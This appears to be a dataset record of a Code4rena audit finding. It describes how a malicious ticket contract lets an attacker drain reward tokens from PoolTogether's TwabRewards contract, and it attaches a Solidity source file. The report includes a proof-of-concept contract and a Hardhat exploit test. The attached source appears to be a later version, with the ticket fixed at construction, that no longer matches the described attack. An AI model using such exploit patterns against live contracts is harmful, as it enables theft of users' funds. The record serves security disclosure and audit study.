{
  "Title": "[H-05] Malicious tickets can lead to the loss of all tokens",
  "Content": "_Submitted by johnnycash, also found by WatchPug, csanuragjain, gpersoon, gzeon, harleythedog, kemmio, kenzo, leastwood, and pauliax_\n\n#### Impact\n\nIt allows an attacker to retrieve all the tokens of each promotions.\n\n#### Analysis\n\nAnyone can create a new promotion using `createPromotion()`. An attacker can create a new malicious promotion with the following parameters:\n\n*   the address of a malicious ticket smart contract\n*   the token address from the targeted promotion(s)\n*   optionally, `_numberOfEpochs` equal to 0 to create this promotion for free\n\nThe only verification made on the ticket address given by [\\_requireTicket()](https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the `ITicket` interface.\n\nThe attacker can then call `claimRewards()` with its wallet address, the malicious promotion id and a single \\_epochId for the sake of clarity.\n\n1.  `_calculateRewardAmount()` is first called to get the reward amount with the following formula `(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween()`. The malicious ticket can return an arbitrary  `_averageBalance` and an `_averageTotalSupplies` of 1, leading to an arbitrary large reward amount.\n\n2.  `_promotion.token.safeTransfer(_user, _rewardsAmount)` is called. It transfers the amount of tokens previously computed to the attacker.\n\nThe attacker receives the tokens of other promotions without having spent anything.\n\n#### Proof of Concept\n\nThe malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol) with the following changes:\n```solidity\n/// @inheritdoc ITicket\nfunction getAverageTotalSuppliesBetween(\n    uint64[] calldata _startTimes,\n    uint64[] calldata _endTimes\n) external view override returns (uint256[] memory) {\n    uint256[] memory _balances = new uint256[](1);\n    _balances[0] = uint256(1);\n    return _balances;\n}\n\n/// @inheritdoc ITicket\nfunction getAverageBalanceBetween(\n    address _user,\n    uint64 _startTime,\n    uint64 _endTime\n) external view override returns (uint256) {\n    return 1337;\n}\n```\n\nThe test for HardHat is:\n```js\ndescribe('exploit()', async () => {\n    it('this shouldnt happen', async () => {\n        const promotionIdOne = 1;\n        const promotionIdTwo = 2;\n\n        await expect(createPromotion(ticket.address))\n            .to.emit(twabRewards, 'PromotionCreated')\n            .withArgs(promotionIdOne);\n        \n        let evilTicketFactory = await getContractFactory('EvilTicket');\n        let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);\n        let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;\n        await expect(twabRewards.connect(wallet2).createPromotion(\n            evilTicket.address,\n            rewardToken.address,\n            tokensPerEpoch,\n            createPromotionTimestamp,\n            1,//epochDuration,\n            0,//epochsNumber,\n        )).to.emit(twabRewards, 'PromotionCreated')\n            .withArgs(promotionIdTwo);\n\n        await increaseTime(100);\n        const epochIds = ['100'];\n        await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);\n    });\n});\n```\nIt results in the following error:\n```\n1) TwabRewards\n    exploit()\n        this shouldnt happen:\n    Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'\n    at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)\n    at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)\n    at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)\n    at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)\n    at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)\n    at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)\n```\n#### Recommended Mitigation Steps\n\nMaybe add a whitelist of trusted tickets?\n\n**[PierrickGT (PoolTogether) confirmed](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/1)** \n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2021-12-pooltogether",
  "Code": [
    {
      "filename": "contracts/TwabRewards.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity 0.8.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@pooltogether/v4-core/contracts/interfaces/ITicket.sol\";\n\nimport \"./interfaces/ITwabRewards.sol\";\n\n/**\n * @title PoolTogether V4 TwabRewards\n * @author PoolTogether Inc Team\n * @notice Contract to distribute rewards to depositors in a pool.\n * This contract supports the creation of several promotions that can run simultaneously.\n * In order to calculate user rewards, we use the TWAB (Time-Weighted Average Balance) from the Ticket contract.\n * This way, users simply need to hold their tickets to be eligible to claim rewards.\n * Rewards are calculated based on the average amount of tickets they hold during the epoch duration.\n * @dev This contract supports only one prize pool ticket.\n * @dev This contract does not support the use of fee on transfer tokens.\n */\ncontract TwabRewards is ITwabRewards {\n    using SafeERC20 for IERC20;\n\n    /* ============ Global Variables ============ */\n\n    /// @notice Prize pool ticket for which the promotions are created.\n    ITicket public immutable ticket;\n\n    /// @notice Period during which the promotion owner can't destroy a promotion.\n    uint32 public constant GRACE_PERIOD = 60 days;\n\n    /// @notice Settings of each promotion.\n    mapping(uint256 => Promotion) internal _promotions;\n\n    /**\n     * @notice Latest recorded promotion id.\n     * @dev Starts at 0 and is incremented by 1 for each new promotion. So the first promotion will have id 1, the second 2, etc.\n     */\n    uint256 internal _latestPromotionId;\n\n    /**\n     * @notice Keeps track of claimed rewards per user.\n     * @dev _claimedEpochs[promotionId][user] => claimedEpochs\n     * @dev We pack epochs claimed by a user into a uint256. So we can't store more than 256 epochs.\n     */\n    mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;\n\n    /* ============ Events ============ */\n\n    /**\n     * @notice Emitted when a promotion is created.\n     * @param promotionId Id of the newly created promotion\n     */\n    event PromotionCreated(uint256 indexed promotionId);\n\n    /**\n     * @notice Emitted when a promotion is ended.\n     * @param promotionId Id of the promotion being ended\n     * @param recipient Address of the recipient that will receive the remaining rewards\n     * @param amount Amount of tokens transferred to the recipient\n     * @param epochNumber Epoch number at which the promotion ended\n     */\n    event PromotionEnded(\n        uint256 indexed promotionId,\n        address indexed recipient,\n        uint256 amount,\n        uint8 epochNumber\n    );\n\n    /**\n     * @notice Emitted when a promotion is destroyed.\n     * @param promotionId Id of the promotion being destroyed\n     * @param recipient Address of the recipient that will receive the unclaimed rewards\n     * @param amount Amount of tokens transferred to the recipient\n     */\n    event PromotionDestroyed(\n        uint256 indexed promotionId,\n        address indexed recipient,\n        uint256 amount\n    );\n\n    /**\n     * @notice Emitted when a promotion is extended.\n     * @param promotionId Id of the promotion being extended\n     * @param numberOfEpochs Number of epochs the promotion has been extended by\n     */\n    event PromotionExtended(uint256 indexed promotionId, uint256 numberOfEpochs);\n\n    /**\n     * @notice Emitted when rewards have been claimed.\n     * @param promotionId Id of the promotion for which epoch rewards were claimed\n     * @param epochIds Ids of the epochs being claimed\n     * @param user Address of the user for which the rewards were claimed\n     * @param amount Amount of tokens transferred to the recipient address\n     */\n    event RewardsClaimed(\n        uint256 indexed promotionId,\n        uint8[] epochIds,\n        address indexed user,\n        uint256 amount\n    );\n\n    /* ============ Constructor ============ */\n\n    /**\n     * @notice Constructor of the contract.\n     * @param _ticket Prize Pool ticket address for which the promotions will be created\n     */\n    constructor(ITicket _ticket) {\n        _requireTicket(_ticket);\n        ticket = _ticket;\n    }\n\n    /* ============ External Functions ============ */\n\n    /// @inheritdoc ITwabRewards\n    function createPromotion(\n        IERC20 _token,\n        uint64 _startTimestamp,\n        uint256 _tokensPerEpoch,\n        uint48 _epochDuration,\n        uint8 _numberOfEpochs\n    ) external override returns (uint256) {\n        require(_tokensPerEpoch > 0, \"TwabRewards/tokens-not-zero\");\n        require(_epochDuration > 0, \"TwabRewards/duration-not-zero\");\n        _requireNumberOfEpochs(_numberOfEpochs);\n\n        uint256 _nextPromotionId = _latestPromotionId + 1;\n        _latestPromotionId = _nextPromotionId;\n\n        uint256 _amount = _tokensPerEpoch * _numberOfEpochs;\n\n        _promotions[_nextPromotionId] = Promotion({\n            creator: msg.sender,\n            startTimestamp: _startTimestamp,\n            numberOfEpochs: _numberOfEpochs,\n            epochDuration: _epochDuration,\n            createdAt: uint48(block.timestamp),\n            token: _token,\n            tokensPerEpoch: _tokensPerEpoch,\n            rewardsUnclaimed: _amount\n        });\n\n        uint256 _beforeBalance = _token.balanceOf(address(this));\n\n        _token.safeTransferFrom(msg.sender, address(this), _amount);\n\n        uint256 _afterBalance = _token.balanceOf(address(this));\n\n        require(_beforeBalance + _amount == _afterBalance, \"TwabRewards/promo-amount-diff\");\n\n        emit PromotionCreated(_nextPromotionId);\n\n        return _nextPromotionId;\n    }\n\n    /// @inheritdoc ITwabRewards\n    function endPromotion(uint256 _promotionId, address _to) external override returns (bool) {\n        require(_to != address(0), \"TwabRewards/payee-not-zero-addr\");\n\n        Promotion memory _promotion = _getPromotion(_promotionId);\n        _requirePromotionCreator(_promotion);\n        _requirePromotionActive(_promotion);\n\n        uint8 _epochNumber = uint8(_getCurrentEpochId(_promotion));\n        _promotions[_promotionId].numberOfEpochs = _epochNumber;\n\n        uint256 _remainingRewards = _getRemainingRewards(_promotion);\n        _promotions[_promotionId].rewardsUnclaimed -= _remainingRewards;\n\n        _promotion.token.safeTransfer(_to, _remainingRewards);\n\n        emit PromotionEnded(_promotionId, _to, _remainingRewards, _epochNumber);\n\n        return true;\n    }\n\n    /// @inheritdoc ITwabRewards\n    function destroyPromotion(uint256 _promotionId, address _to) external override returns (bool) {\n        require(_to != address(0), \"TwabRewards/payee-not-zero-addr\");\n\n        Promotion memory _promotion = _getPromotion(_promotionId);\n        _requirePromotionCreator(_promotion);\n\n        uint256 _promotionEndTimestamp = _getPromotionEndTimestamp(_promotion);\n        uint256 _promotionCreatedAt = _promotion.createdAt;\n\n        uint256 _gracePeriodEndTimestamp = (\n            _promotionEndTimestamp < _promotionCreatedAt\n                ? _promotionCreatedAt\n                : _promotionEndTimestamp\n        ) + GRACE_PERIOD;\n\n        require(block.timestamp >= _gracePeriodEndTimestamp, \"TwabRewards/grace-period-active\");\n\n        uint256 _rewardsUnclaimed = _promotion.rewardsUnclaimed;\n        delete _promotions[_promotionId];\n\n        _promotion.token.safeTransfer(_to, _rewardsUnclaimed);\n\n        emit PromotionDestroyed(_promotionId, _to, _rewardsUnclaimed);\n\n        return true;\n    }\n\n    /// @inheritdoc ITwabRewards\n    function extendPromotion(uint256 _promotionId, uint8 _numberOfEpochs)\n        external\n        override\n        returns (bool)\n    {\n        _requireNumberOfEpochs(_numberOfEpochs);\n\n        Promotion memory _promotion = _getPromotion(_promotionId);\n        _requirePromotionActive(_promotion);\n\n        uint8 _currentNumberOfEpochs = _promotion.numberOfEpochs;\n\n        require(\n            _numberOfEpochs <= (type(uint8).max - _currentNumberOfEpochs),\n            \"TwabRewards/epochs-over-limit\"\n        );\n\n        _promotions[_promotionId].numberOfEpochs = _currentNumberOfEpochs + _numberOfEpochs;\n\n        uint256 _amount = _numberOfEpochs * _promotion.tokensPerEpoch;\n\n        _promotions[_promotionId].rewardsUnclaimed += _amount;\n        _promotion.token.safeTransferFrom(msg.sender, address(this), _amount);\n\n        emit PromotionExtended(_promotionId, _numberOfEpochs);\n\n        return true;\n    }\n\n    /// @inheritdoc ITwabRewards\n    function claimRewards(\n        address _user,\n        uint256 _promotionId,\n        uint8[] calldata _epochIds\n    ) external override returns (uint256) {\n        Promotion memory _promotion = _getPromotion(_promotionId);\n\n        uint256 _rewardsAmount;\n        uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];\n        uint256 _epochIdsLength = _epochIds.length;\n\n        for (uint256 index = 0; index < _epochIdsLength; index++) {\n            uint8 _epochId = _epochIds[index];\n\n            require(!_isClaimedEpoch(_userClaimedEpochs, _epochId), \"TwabRewards/rewards-claimed\");\n\n            _rewardsAmount += _calculateRewardAmount(_user, _promotion, _epochId);\n            _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);\n        }\n\n        _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;\n        _promotions[_promotionId].rewardsUnclaimed -= _rewardsAmount;\n\n        _promotion.token.safeTransfer(_user, _rewardsAmount);\n\n        emit RewardsClaimed(_promotionId, _epochIds, _user, _rewardsAmount);\n\n        return _rewardsAmount;\n    }\n\n    /// @inheritdoc ITwabRewards\n    function getPromotion(uint256 _promotionId) external view override returns (Promotion memory) {\n        return _getPromotion(_promotionId);\n    }\n\n    /// @inheritdoc ITwabRewards\n    function getCurrentEpochId(uint256 _promotionId) external view override returns (uint256) {\n        return _getCurrentEpochId(_getPromotion(_promotionId));\n    }\n\n    /// @inheritdoc ITwabRewards\n    function getRemainingRewards(uint256 _promotionId) external view override returns (uint256) {\n        return _getRemainingRewards(_getPromotion(_promotionId));\n    }\n\n    /// @inheritdoc ITwabRewards\n    function getRewardsAmount(\n        address _user,\n        uint256 _promotionId,\n        uint8[] calldata _epochIds\n    ) external view override returns (uint256[] memory) {\n        Promotion memory _promotion = _getPromotion(_promotionId);\n\n        uint256 _epochIdsLength = _epochIds.length;\n        uint256[] memory _rewardsAmount = new uint256[](_epochIdsLength);\n\n        for (uint256 index = 0; index < _epochIdsLength; index++) {\n            if (_isClaimedEpoch(_claimedEpochs[_promotionId][_user], _epochIds[index])) {\n                _rewardsAmount[index] = 0;\n            } else {\n                _rewardsAmount[index] = _calculateRewardAmount(_user, _promotion, _epochIds[index]);\n            }\n        }\n\n        return _rewardsAmount;\n    }\n\n    /* ============ Internal Functions ============ */\n\n    /**\n     * @notice Determine if address passed is actually a ticket.\n     * @param _ticket Address to check\n     */\n    function _requireTicket(ITicket _ticket) internal view {\n        require(address(_ticket) != address(0), \"TwabRewards/ticket-not-zero-addr\");\n\n        (bool succeeded, bytes memory data) = address(_ticket).staticcall(\n            abi.encodePacked(_ticket.controller.selector)\n        );\n\n        require(\n            succeeded && data.length > 0 && abi.decode(data, (uint160)) != 0,\n            \"TwabRewards/invalid-ticket\"\n        );\n    }\n\n    /**\n     * @notice Allow a promotion to be created or extended only by a positive number of epochs.\n     * @param _numberOfEpochs Number of epochs to check\n     */\n    function _requireNumberOfEpochs(uint8 _numberOfEpochs) internal pure {\n        require(_numberOfEpochs > 0, \"TwabRewards/epochs-not-zero\");\n    }\n\n    /**\n     * @notice Determine if a promotion is active.\n     * @param _promotion Promotion to check\n     */\n    function _requirePromotionActive(Promotion memory _promotion) internal view {\n        require(\n            _getPromotionEndTimestamp(_promotion) > block.timestamp,\n            \"TwabRewards/promotion-inactive\"\n        );\n    }\n\n    /**\n     * @notice Determine if msg.sender is the promotion creator.\n     * @param _promotion Promotion to check\n     */\n    function _requirePromotionCreator(Promotion memory _promotion) internal view {\n        require(msg.sender == _promotion.creator, \"TwabRewards/only-promo-creator\");\n    }\n\n    /**\n     * @notice Get settings for a specific promotion.\n     * @dev Will revert if the promotion does not exist.\n     * @param _promotionId Promotion id to get settings for\n     * @return Promotion settings\n     */\n    function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {\n        Promotion memory _promotion = _promotions[_promotionId];\n        require(_promotion.creator != address(0), \"TwabRewards/invalid-promotion\");\n        return _promotion;\n    }\n\n    /**\n     * @notice Compute promotion end timestamp.\n     * @param _promotion Promotion to compute end timestamp for\n     * @return Promotion end timestamp\n     */\n    function _getPromotionEndTimestamp(Promotion memory _promotion)\n        internal\n        pure\n        returns (uint256)\n    {\n        unchecked {\n            return\n                _promotion.startTimestamp + (_promotion.epochDuration * _promotion.numberOfEpochs);\n        }\n    }\n\n    /**\n     * @notice Get the current epoch id of a promotion.\n     * @dev Epoch ids and their boolean values are tightly packed and stored in a uint256, so epoch id starts at 0.\n     * @dev We return the current epoch id if the promotion has not ended.\n     * If the current timestamp is before the promotion start timestamp, we return 0.\n     * Otherwise, we return the epoch id at the current timestamp. This could be greater than the number of epochs of the promotion.\n     * @param _promotion Promotion to get current epoch for\n     * @return Epoch id\n     */\n    function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {\n        uint256 _currentEpochId;\n\n        if (block.timestamp > _promotion.startTimestamp) {\n            unchecked {\n                _currentEpochId =\n                    (block.timestamp - _promotion.startTimestamp) /\n                    _promotion.epochDuration;\n            }\n        }\n\n        return _currentEpochId;\n    }\n\n    /**\n     * @notice Get reward amount for a specific user.\n     * @dev Rewards can only be calculated once the epoch is over.\n     * @dev Will revert if `_epochId` is over the total number of epochs or if epoch is not over.\n     * @dev Will return 0 if the user average balance of tickets is 0.\n     * @param _user User to get reward amount for\n     * @param _promotion Promotion from which the epoch is\n     * @param _epochId Epoch id to get reward amount for\n     * @return Reward amount\n     */\n    function _calculateRewardAmount(\n        address _user,\n        Promotion memory _promotion,\n        uint8 _epochId\n    ) internal view returns (uint256) {\n        uint64 _epochDuration = _promotion.epochDuration;\n        uint64 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);\n        uint64 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;\n\n        require(block.timestamp >= _epochEndTimestamp, \"TwabRewards/epoch-not-over\");\n        require(_epochId < _promotion.numberOfEpochs, \"TwabRewards/invalid-epoch-id\");\n\n        uint256 _averageBalance = ticket.getAverageBalanceBetween(\n            _user,\n            _epochStartTimestamp,\n            _epochEndTimestamp\n        );\n\n        if (_averageBalance > 0) {\n            uint64[] memory _epochStartTimestamps = new uint64[](1);\n            _epochStartTimestamps[0] = _epochStartTimestamp;\n\n            uint64[] memory _epochEndTimestamps = new uint64[](1);\n            _epochEndTimestamps[0] = _epochEndTimestamp;\n\n            uint256 _averageTotalSupply = ticket.getAverageTotalSuppliesBetween(\n                _epochStartTimestamps,\n                _epochEndTimestamps\n            )[0];\n\n            return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupply;\n        }\n\n        return 0;\n    }\n\n    /**\n     * @notice Get the total amount of tokens left to be rewarded.\n     * @param _promotion Promotion to get the total amount of tokens left to be rewarded for\n     * @return Amount of tokens left to be rewarded\n     */\n    function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {\n        if (block.timestamp > _getPromotionEndTimestamp(_promotion)) {\n            return 0;\n        }\n\n        return\n            _promotion.tokensPerEpoch *\n            (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion));\n    }\n\n    /**\n    * @notice Set boolean value for a specific epoch.\n    * @dev Bits are stored in a uint256 from right to left.\n        Let's take the example of the following 8 bits word. 0110 0011\n        To set the boolean value to 1 for the epoch id 2, we need to create a mask by shifting 1 to the left by 2 bits.\n        We get: 0000 0001 << 2 = 0000 0100\n        We then OR the mask with the word to set the value.\n        We get: 0110 0011 | 0000 0100 = 0110 0111\n    * @param _userClaimedEpochs Tightly packed epoch ids with their boolean values\n    * @param _epochId Id of the epoch to set the boolean for\n    * @return Tightly packed epoch ids with the newly boolean value set\n    */\n    function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint8 _epochId)\n        internal\n        pure\n        returns (uint256)\n    {\n        return _userClaimedEpochs | (uint256(1) << _epochId);\n    }\n\n    /**\n    * @notice Check if rewards of an epoch for a given promotion have already been claimed by the user.\n    * @dev Bits are stored in a uint256 from right to left.\n        Let's take the example of the following 8 bits word. 0110 0111\n        To retrieve the boolean value for the epoch id 2, we need to shift the word to the right by 2 bits.\n        We get: 0110 0111 >> 2 = 0001 1001\n        We then get the value of the last bit by masking with 1.\n        We get: 0001 1001 & 0000 0001 = 0000 0001 = 1\n        We then return the boolean value true since the last bit is 1.\n    * @param _userClaimedEpochs Record of epochs already claimed by the user\n    * @param _epochId Epoch id to check\n    * @return true if the rewards have already been claimed for the given epoch, false otherwise\n     */\n    function _isClaimedEpoch(uint256 _userClaimedEpochs, uint8 _epochId)\n        internal\n        pure\n        returns (bool)\n    {\n        return (_userClaimedEpochs >> _epochId) & uint256(1) == 1;\n    }\n}"
    }
  ]
}